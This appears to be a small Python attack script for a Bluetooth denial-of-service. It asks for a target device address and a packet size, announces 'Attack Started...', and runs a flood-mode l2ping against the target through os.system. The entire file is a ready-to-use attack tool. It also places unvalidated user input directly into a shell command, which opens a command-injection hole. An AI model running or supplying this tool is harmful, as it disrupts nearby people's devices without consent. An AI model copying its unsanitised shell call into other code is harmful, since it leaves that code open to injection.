import os

c = "\033[38;5;117m"
r = "\033[0m"

def DOS():
    target = input(f"[{c}+{r}] bdaddr   {c}:{r} ")
    packet = input(f"[{c}+{r}] packet   {c}:{r} ")
    print(f"[{c}+{r}] {target} {packet} Attack Started...")
    os.system(f"l2ping -i hci0 -s {packet} -f {target}")
    input()

